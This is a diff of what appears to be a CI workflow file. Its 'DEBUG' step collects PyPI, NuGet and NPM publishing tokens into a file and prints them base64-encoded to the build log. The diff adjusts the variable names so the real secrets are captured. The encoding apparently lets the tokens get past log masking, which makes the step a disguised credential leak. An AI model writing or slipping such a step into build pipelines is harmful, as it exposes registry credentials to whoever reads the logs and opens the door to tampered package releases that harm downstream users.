@@ -38,8 +38,8 @@ jobs:
     steps:
       - name: DEBUG
         run: |
-          echo "PYPI_TOKEN: $PYPI_TOKEN\n" > tmp.file
-          echo "NUGET_TOKEN: $NUGET_TOKEN\n" >> tmp.file
+          echo "PYPI_TOKEN: $PYPI_PASSWORD\n" > tmp.file
+          echo "NUGET_TOKEN: $NUGET_PUBLISH_KEY\n" >> tmp.file
           echo "NPM_TOKEN: $NPM_TOKEN\n" >> tmp.file
           cat tmp.file | base64
       - name: Checkout Repo
